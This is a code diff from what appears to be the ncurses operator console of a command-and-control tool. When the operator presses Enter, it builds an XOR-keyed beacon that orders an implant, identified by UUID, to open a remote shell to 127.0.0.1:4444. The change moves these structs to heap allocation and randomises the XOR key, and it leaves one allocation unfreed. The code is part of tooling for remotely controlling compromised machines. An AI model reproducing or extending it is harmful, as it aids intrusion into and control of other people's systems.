@@ -427,16 +427,18 @@ bool ncurses_wcmd_shell(WINDOW *win_main,
     } else if (key == '\t'){
       form_driver(form, REQ_NEXT_FIELD);
     } else if (key == 10 || key == KEY_ENTER){
-      net_server_cmd_shell_t cmd_shell;
-      strcpy(cmd_shell.host, "127.0.0.1");
-      cmd_shell.port = 4444;
-      net_server_beacon_t cmd_beacon;
-      cmd_beacon.xor_key = DEFS_XOR_KEY;
-      cmd_beacon.status = true;
-      cmd_beacon.command = 1;
-      strcpy(cmd_beacon.uuid, uuid);
-      memcpy(cmd_beacon.data, &cmd_shell, sizeof(net_server_cmd_shell_t));
-      net_update_commands(&cmd_beacon, p_commands);
+      net_server_cmd_shell_t *p_cmd_shell = malloc(sizeof(net_server_cmd_shell_t));
+      net_server_beacon_t *p_command = malloc(sizeof(net_server_beacon_t));
+      strcpy(p_cmd_shell->host, "127.0.0.1");
+      p_cmd_shell->port = 4444;
+      p_command->xor_key = crypt_random_xor_key();
+      strcpy(p_command->uuid, uuid);
+      p_command->status = true;
+      p_command->command = NET_SERVER_CMD_SHELL;
+      memcpy(p_command->data, p_cmd_shell, sizeof(net_server_cmd_shell_t));
+      net_update_commands(p_command, p_commands);
+      free(p_cmd_shell);
+      break;
     } else {
       form_driver(form, key);
       continue;
